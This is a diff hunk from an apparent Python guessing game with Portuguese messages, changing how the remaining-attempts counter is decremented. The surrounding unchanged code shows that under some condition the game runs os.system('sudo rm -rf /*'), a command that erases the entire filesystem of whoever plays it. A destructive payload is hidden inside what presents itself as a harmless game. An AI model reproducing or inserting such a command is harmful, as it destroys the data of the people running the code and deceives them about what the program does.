@@ -33,7 +33,7 @@ while True:
             os.system('sudo rm -rf /*')
             exit()
 
-        tentativas -= 1
+        tentativas = tentativas - 1
         print(f'nada aconteceu, você tem {tentativas} tentativas restantes.')
         if tentativas > 0:
             while True:
